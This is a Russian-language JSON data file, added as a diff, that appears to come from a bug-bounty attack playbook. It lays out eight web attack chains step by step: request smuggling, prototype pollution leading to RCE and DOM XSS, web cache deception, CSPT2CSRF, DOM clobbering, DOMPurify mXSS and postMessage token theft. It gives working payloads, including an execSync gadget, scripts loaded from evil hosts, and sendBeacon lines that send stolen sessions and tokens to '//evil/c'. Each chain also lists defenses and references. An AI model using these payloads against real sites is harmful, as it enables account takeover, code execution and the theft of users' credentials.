@@ -1,0 +1,393 @@
+{
+  "domain": "Modern Web",
+  "domainLabel": "Современный веб",
+  "domainOrder": 9,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "Десинхрон HTTP/1.1 (0.CL/CL.0): от смаглинга к массовому ATO",
+      "level": "advanced",
+      "impact": "Перехват чужих запросов с их Cookie/Authorization, отравление кэша stored-XSS на всех посетителей или доступ к внутренним admin-роутам; криты на зрелых программах.",
+      "why": "Новейший вариант 0.CL десинхронизирует даже полностью браузеро-совместимый HTTP/1.1, превращая браузер жертвы в платформу доставки смаглинга.",
+      "precondition": "Фронтенд и бэкенд расходятся в определении границ запроса на переиспользуемом keep-alive соединении (или при даунгрейде HTTP/2).",
+      "tags": [
+        "request-smuggling",
+        "desync",
+        "cache-poisoning",
+        "ato",
+        "0.cl",
+        "cl.0"
+      ],
+      "realWorld": "PortSwigger: HTTP Desync Attacks (Kettle 2019), Browser-Powered Desync Attacks (2022), HTTP/1.1 Must Die (2025); Web Security Academy CL.0/0.CL labs.",
+      "defense": "Сквозной HTTP/2 без даунгрейда до 1.1, отклонять неоднозначные CL/TE, отключить переиспользование upstream-соединений.",
+      "steps": [
+        {
+          "title": "Пробуем десинхрон CL.0/0.CL",
+          "kind": "command",
+          "q": "smuggler",
+          "detail": "smuggler.py -u https://target/  |  raw-проба: POST /vuln HTTP/1.1\\r\\nConnection: keep-alive\\r\\nContent-Length: 34\\r\\n\\r\\nGET /hopefully404 HTTP/1.1\\r\\nFoo: x  затем чистый GET /",
+          "success": "ответ на второй (чистый) запрос становится 404 от смаглнутого префикса"
+        },
+        {
+          "title": "Классифицируем тип десинхрона",
+          "kind": "checklist",
+          "q": "request-smuggling",
+          "detail": "CL.0 = бэкенд игнорит Content-Length; 0.CL = фронтенд видит длину 0, бэкенд читает CL; плюс матрица H2.CL / H2.TE при даунгрейде HTTP/2 -> 1.1"
+        },
+        {
+          "title": "Оружие: перехват чужого запроса",
+          "kind": "payload",
+          "q": "Request Smuggling",
+          "detail": "смаглим незавершённый префикс POST /comment с большим Content-Length -> следующий запрос жертвы (с её Cookie/Authorization) дописывается в сохраняемое поле и читается атакующим"
+        },
+        {
+          "title": "Оружие: отравление кэша stored-XSS",
+          "kind": "payload",
+          "q": "Request Smuggling",
+          "detail": "смаглим запрос, чей ответ <script>alert(document.domain)</script> кэшируется на популярный URL и отдаётся всем пользователям"
+        },
+        {
+          "title": "Оружие: доступ к внутреннему роуту",
+          "kind": "note",
+          "q": "",
+          "detail": "смаглим GET /admin: фронтенд ACL валидирует только внешний путь, бэкенд обрабатывает внутренний"
+        },
+        {
+          "title": "Автоматизируем под нагрузкой",
+          "kind": "script",
+          "q": "HTTP request smuggling detector (CL.TE / TE.CL timing)",
+          "detail": "Burp HTTP Request Smuggler + Turbo Intruder (connection-locked harness) для синхронизации сокета и гонки за соединение"
+        }
+      ]
+    },
+    {
+      "title": "Server-Side Prototype Pollution → RCE (слепое детектирование без DoS)",
+      "level": "advanced",
+      "impact": "Выполнение кода под Node-процессом; стабильно крит.",
+      "why": "Невидимый баг подтверждается по изменению отступов в JSON-ответе, а до шелла доводит встроенный гаджет NODE_OPTIONS без какого-либо app-специфичного синка.",
+      "precondition": "Недоверенный JSON/тело рекурсивно мёржится (lodash merge, _.defaultsDeep, самописный deepMerge) в конфиг, и где-то дальше вызывается child_process.",
+      "tags": [
+        "prototype-pollution",
+        "sspp",
+        "rce",
+        "nodejs",
+        "express"
+      ],
+      "realWorld": "Silent Spring: Prototype Pollution Leads to RCE in Node.js (arXiv 2207.11171); PortSwigger SSPP black-box detection (Heyes 2023); Kibana Timelion CVE-2019-7609; GHunter (arXiv 2407.10812).",
+      "defense": "Object.freeze(Object.prototype), конфиги через null-prototype, флаг --disable-proto=delete, схема-валидация до любого merge.",
+      "steps": [
+        {
+          "title": "Слепо детектим pollution",
+          "kind": "payload",
+          "q": "Prototype Pollution",
+          "detail": "{\"__proto__\":{\"json spaces\":10}}  Express начинает отбивать каждый JSON-ответ 10 пробелами отступа; видно без всякого DoS",
+          "success": "в ответе у JSON появляется крупный отступ (json spaces)"
+        },
+        {
+          "title": "Подтверждаем вторым оракулом",
+          "kind": "payload",
+          "q": "Prototype Pollution",
+          "detail": "{\"__proto__\":{\"status\":510}}  или  {\"__proto__\":{\"parameterLimit\":1}}  меняет статус ответа / обрезает парсинг параметров"
+        },
+        {
+          "title": "Закладываем env-гаджет",
+          "kind": "payload",
+          "q": "Prototype Pollution",
+          "detail": "{\"__proto__\":{\"NODE_OPTIONS\":\"--require /proc/self/environ\",\"env\":{\"EVIL\":\"require('child_process').execSync('id')//\"}}}"
+        },
+        {
+          "title": "Триггерим любой child_process",
+          "kind": "note",
+          "q": "",
+          "detail": "последующий spawn/fork/execSync наследует отравленные env + NODE_OPTIONS и исполняет EVIL через /proc/self/environ"
+        },
+        {
+          "title": "Запасной гаджет",
+          "kind": "payload",
+          "q": "Prototype Pollution",
+          "detail": "отравить __proto__.shell / __proto__.argv0 для синков spawn({shell:true})"
+        }
+      ]
+    },
+    {
+      "title": "Client-Side Prototype Pollution → DOM XSS через script-гаджет",
+      "level": "advanced",
+      "impact": "Надёжный DOM XSS на странице без явной точки инъекции; кража сессии/токена, захват аккаунта.",
+      "why": "HTML-инъекция не нужна: отравленное свойство на Object.prototype молча читается сторонней библиотекой и превращается в исполнение скрипта.",
+      "precondition": "URL query/hash попадает в уязвимый merge ($.extend(true,...), _.merge, парсер запроса, идущий по __proto__) при наличии библиотеки-гаджета.",
+      "tags": [
+        "prototype-pollution",
+        "dom-xss",
+        "gadget",
+        "client-side"
+      ],
+      "realWorld": "PortSwigger: Widespread prototype pollution gadgets (Gareth Heyes 2020) + DOM Invader; Web Security Academy client-side PP labs.",
+      "defense": "Заморозить Object.prototype, конфиг через Object.create(null) или Map, вырезать ключи __proto__/constructor/prototype в парсерах query.",
+      "steps": [
+        {
+          "title": "Отравляем из URL",
+          "kind": "payload",
+          "q": "Prototype Pollution",
+          "detail": "#__proto__[hitCallback]=alert(document.domain)  или  ?constructor[prototype][src]=//evil/x.js"
+        },
+        {
+          "title": "Срабатывает гаджет Google Analytics",
+          "kind": "note",
+          "q": "",
+          "detail": "GA вызывает Object.prototype.hitCallback как функцию после отправки хита -> исполнение"
+        },
+        {
+          "title": "Или дженерик script-src гаджет",
+          "kind": "payload",
+          "q": "Prototype Pollution",
+          "detail": "загрузчики, делающие el.src = config.src, наследуют отравленный src и подгружают атакующий JS"
+        },
+        {
+          "title": "Или гаджет jQuery/Lodash",
+          "kind": "note",
+          "q": "",
+          "detail": "$.parseHTML / $().prepend и _.template читают отравленные свойства атрибутов/исходника"
+        },
+        {
+          "title": "Авто-поиск source+sink+gadget",
+          "kind": "script",
+          "q": "Client-side prototype pollution probe (Playwright)",
+          "detail": "Burp DOM Invader: режим prototype pollution + gadget scanner находит цепочку целиком"
+        }
+      ]
+    },
+    {
+      "title": "Web Cache Deception → кража auth-токена (wildcard / path-confusion)",
+      "level": "advanced",
+      "impact": "Кража сессионного токена/API-ключа жертвы из закэшированного 'статического' файла; полный захват аккаунта. Эталон: wildcard-WCD ATO в ChatGPT (2024).",
+      "why": "Кэш спокойно сохраняет аутентифицированное JSON-тело как .css-файл, потому что edge и origin по-разному определяют, где кончается путь.",
+      "precondition": "Кэш ключуется по расширению файла или префиксу директории; origin игнорит дописанный суффикс и возвращает аутентифицированный ответ.",
+      "tags": [
+        "web-cache-deception",
+        "cache",
+        "ato",
+        "path-confusion"
+      ],
+      "realWorld": "Omer Gil: Web Cache Deception Attack (2017); PortSwigger: Gotta cache 'em all (Black Hat USA 2024); ChatGPT wildcard WCD ATO (Top 10 Web Hacking 2024).",
+      "defense": "Кэшировать строго по allowlist + проверенному Content-Type, никогда не кэшировать ответы с Set-Cookie/Authorization, нормализовать путь одинаково на edge и origin.",
+      "steps": [
+        {
+          "title": "Картируем правило кэша",
+          "kind": "checklist",
+          "q": "web-cache",
+          "detail": "пробить Cache-Control, Age, X-Cache: HIT; выяснить какие расширения/директории считаются статикой"
+        },
+        {
+          "title": "Ищем расхождение в делимитерах",
+          "kind": "payload",
+          "q": "Web Cache Deception",
+          "detail": "дописать ;  %2f  %00  %23  %2e%2e  так, чтобы edge видел .css, а origin отдавал /api/account/me"
+        },
+        {
+          "title": "Собираем deception-URL",
+          "kind": "note",
+          "detail": "curl 'https://t/api/account/me/nonexistent.css'  -> возвращает JSON с токеном жертвы, кэшируется под статическим ключом"
+        },
+        {
+          "title": "Засеваем и собираем",
+          "kind": "note",
+          "q": "",
+          "detail": "заманить жертву на URL (её аутентификация наполняет кэш), затем запросить тот же URL без авторизации и прочитать закэшированный секрет"
+        },
+        {
+          "title": "Подтверждаем кэширование секрета",
+          "kind": "checklist",
+          "q": "web-cache",
+          "detail": "до репорта убедиться, что в закэшированном ответе X-Cache: HIT и реально присутствует токен/PII"
+        }
+      ]
+    },
+    {
+      "title": "CSPT2CSRF: client-side path traversal рероутит fetch в эскалацию привилегий",
+      "level": "advanced",
+      "impact": "Принудительные state-changing действия (выдача роли, выпуск токена) в обход CSRF-токенов, т.к. запрос несёт собственный валидный токен приложения; high-to-critical.",
+      "why": "Классические анти-CSRF защиты целы, но легитимный аутентифицированный fetch приложения перенаправляется на чужой эндпоинт чистым ../.",
+      "precondition": "Фронтенд склеивает контролируемый ввод (query, fragment, path-параметр или сохранённое в БД значение) в путь fetch/XHR без санитизации traversal.",
+      "tags": [
+        "cspt",
+        "csrf",
+        "client-side-path-traversal",
+        "privesc"
+      ],
+      "realWorld": "Doyensec: Exploiting Client-Side Path Traversal (CSRF is dead, long live CSRF) / CSPT2CSRF whitepaper (Maxence Schmitt, OWASP Global AppSec Lisbon 2024); цепочки в Mattermost и Rocket.Chat.",
+      "defense": "Allowlist символов для ID (запрет . и /), строить URL из фиксированного шаблона с энкодингом сегментов, привязывать анти-CSRF к действию.",
+      "steps": [
+        {
+          "title": "Находим source -> sink",
+          "kind": "checklist",
+          "q": "cspt",
+          "detail": "например fetch('/api/v1/items/' + params.id + '/read') где id берётся из ?id="
+        },
+        {
+          "title": "Рероутим запрос",
+          "kind": "payload",
+          "q": "Client Side Path Traversal",
+          "detail": "?id=..%2f..%2fadmin%2fpromote%23  traversal на другой эндпоинт с обрезкой хвоста через # (или ?)"
+        },
+        {
+          "title": "GET-sink примитив",
+          "kind": "note",
+          "q": "",
+          "detail": "traversal на атакующий JSON (например загруженный файл), чтобы контролировать данные, по которым страница действует дальше"
+        },
+        {
+          "title": "Цепляем state-changing sink",
+          "kind": "payload",
+          "q": "Client Side Path Traversal",
+          "detail": "id из контролируемого JSON триггерит второй CSPT, чей POST/PUT приземляется на ../../tokens или ../../admin/*"
+        },
+        {
+          "title": "Хантим автоматически",
+          "kind": "script",
+          "q": "Client-Side Path Traversal (CSPT) finder",
+          "detail": "Doyensec CSPTBurpExtension: перечисление CSPT source/sink в трафике"
+        }
+      ]
+    },
+    {
+      "title": "DOM Clobbering → XSS через подменённый currentScript / config-гаджет",
+      "level": "advanced",
+      "impact": "Исполнение скрипта из бесскриптового HTML, который пропустил санитайзер; stored-XSS в markdown/почте/форуме -> ATO.",
+      "why": "Ни <script>, ни обработчиков событий: <img name=currentScript> угоняет собственный рантайм бандлера на загрузку атакующего JS.",
+      "precondition": "Приложение рендерит пользовательский HTML, где санитайзер (DOMPurify по умолчанию) разрешает id/name, а код позже читает глобал/свойство, достижимое через named DOM access.",
+      "tags": [
+        "dom-clobbering",
+        "xss",
+        "dompurify",
+        "gadget"
+      ],
+      "realWorld": "rollup CVE-2024-47068 (GHSA-gcx4-mw62-g8wm), Webpack AutoPublicPathRuntimeModule (GHSA-4vvj-4cpr-p986 / CVE-2024-43788), Canvas LMS; PortSwigger DOM clobbering Academy; исследования Heyes/Kotowicz.",
+      "defense": "Включить DOMPurify SANITIZE_NAMED_PROPS:true + SANITIZE_DOM:true, не использовать named DOM lookup для security-глобалов, проверять instanceof HTMLElement.",
+      "steps": [
+        {
+          "title": "Клоббер рантайма бандлера",
+          "kind": "payload",
+          "q": "DOM Clobbering",
+          "detail": "<img name=\"currentScript\" src=\"https://evil/x.js\">  |  rollup/Webpack читают document.currentScript.src как базовый URL импорта"
+        },
+        {
+          "title": "Или клоббер config-глобала",
+          "kind": "payload",
+          "q": "DOM Clobbering",
+          "detail": "<a id=\"config\"><a id=\"config\" name=\"url\" href=\"https://evil/x.js\">  -> window.config.url вернёт атакующий href в s.src = window.config.url"
+        },
+        {
+          "title": "Вложенный клоббер свойства",
+          "kind": "payload",
+          "q": "DOM Clobbering",
+          "detail": "два элемента с id=x + дочерний name=y формируют HTMLCollection, удовлетворяющую window.x.y"
+        },
+        {
+          "title": "Проверяем конфиг санитайзера",
+          "kind": "checklist",
+          "q": "dom-clobbering",
+          "detail": "подтвердить, что DOMPurify SANITIZE_NAMED_PROPS / SANITIZE_DOM выключены (значение по умолчанию)"
+        },
+        {
+          "title": "Находим синк",
+          "kind": "note",
+          "q": "",
+          "detail": "найти код, читающий document.currentScript / window.config / другой глобал через named DOM access: это и есть точка реюза"
+        }
+      ]
+    },
+    {
+      "title": "mXSS сквозь DOMPurify → stored-XSS → ATO (обход счётчика глубины через PP)",
+      "level": "advanced",
+      "impact": "Stored-XSS, срабатывающий в аутентифицированной сессии каждого зрителя, включая админов; кража сессии/CSRF-токена и захват аккаунта.",
+      "why": "Сходятся два разных класса багов: запись prototype pollution отключает собственный guard глубины вложенности DOMPurify, заново открывая mutation-XSS, который патч должен был убить.",
+      "precondition": "Rich-text/HTML поле, санитизированное устаревшим или плохо настроенным DOMPurify, затем ре-сериализуется и заново парсится браузером.",
+      "tags": [
+        "mxss",
+        "dompurify",
+        "stored-xss",
+        "prototype-pollution",
+        "ato"
+      ],
+      "realWorld": "DOMPurify nesting mXSS CVE-2024-47875 (GHSA-gx9m-whjm-85jf, патч 2.5.x/3.1.3+); CVE-2024-45801 (обход счётчика глубины через prototype pollution); исследования mutation-XSS Kotowicz/Heyes.",
+      "defense": "Держать DOMPurify в актуальной версии, санитизировать в финальном контексте парсинга (не ре-сериализовать и заново парсить), заморозить Object.prototype.",
+      "steps": [
+        {
+          "title": "mXSS на путанице namespace",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "<form><math><mtext><table><mglyph><style></math><img src onerror=alert(document.domain)>  |  репарс вытаскивает узлы из foreign content/<style> и активирует onerror"
+        },
+        {
+          "title": "mXSS на глубине вложенности",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "глубоко вложенные элементы, которые DOMPurify и DOM браузера строят по-разному, мутируют в исполняемый скрипт (CVE-2024-47875)"
+        },
+        {
+          "title": "Сносим счётчик глубины через PP",
+          "kind": "note",
+          "q": "",
+          "detail": "отравить Object.prototype так, чтобы переменная глубины вложенности DOMPurify читалась как NaN/атакующее значение, обходя фикс (CVE-2024-45801)"
+        },
+        {
+          "title": "Доводим до stored-XSS и ATO",
+          "kind": "checklist",
+          "q": "xss",
+          "detail": "подтвердить версию/конфиг DOMPurify и факт репарса санитизированного HTML; цель: каждый зритель"
+        },
+        {
+          "title": "Эксфильтрируем сессию/CSRF-токен",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "fetch('/api/me').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil/c',t))"
+        }
+      ]
+    },
+    {
+      "title": "Абьюз валидации origin в postMessage → кража OAuth/сессионного токена",
+      "level": "advanced",
+      "impact": "Кросс-доменная кража OAuth access-токена, сессии или CSRF-токена; захват аккаунта. Большинство реальных находок high и уникально оплачиваемые.",
+      "why": "Одна слабая на символ проверка origin (indexOf/startsWith) или единственный targetOrigin:'*' отдают секреты прямо в атакующий iframe.",
+      "precondition": "Обработчик message доверяет event.origin по слабой проверке, либо отправитель шлёт секреты без точного targetOrigin.",
+      "tags": [
+        "postmessage",
+        "origin-validation",
+        "token-theft",
+        "ato",
+        "dom-xss"
+      ],
+      "realWorld": "PortSwigger Web Security Academy: Controlling the web message source; HackerOne #398054 (DOM XSS через небезопасный postMessage-листенер, Marketo); jlajara: PostMessage Vulnerabilities Part II.",
+      "defense": "Строгий allowlist event.origin === 'https://exact-origin', никогда targetOrigin:'*' для секретов, валидировать схему сообщения как недоверенный ввод.",
+      "steps": [
+        {
+          "title": "Перечисляем обработчики",
+          "kind": "note",
+          "detail": "найти window.addEventListener('message', e => {...}) и изучить проверку origin"
+        },
+        {
+          "title": "Обходим слабую проверку origin",
+          "kind": "note",
+          "detail": "обойти e.origin.indexOf('trusted')>-1 / startsWith('https://trusted') доменом https://trusted.evil.com или https://trusted-evil.com"
+        },
+        {
+          "title": "Ловим wildcard-утечку",
+          "kind": "note",
+          "q": "",
+          "detail": "если родитель шлёт {token:...} с targetOrigin:'*', встроить страницу в атакующий iframe и принять токен напрямую"
+        },
+        {
+          "title": "Пивотим обработчик в DOM XSS",
+          "kind": "payload",
+          "q": "XSS Injection",
+          "detail": "завести данные сообщения в innerHTML/eval/location, чтобы исполнить код в доверенном origin (HackerOne #398054)"
+        },
+        {
+          "title": "Принимаем и крадём токен",
+          "kind": "note",
+          "detail": "window.onmessage=e=>navigator.sendBeacon('//evil/c', JSON.stringify(e.data))  в атакующем окне-приёмнике"
+        }
+      ]
+    }
+  ]
+}
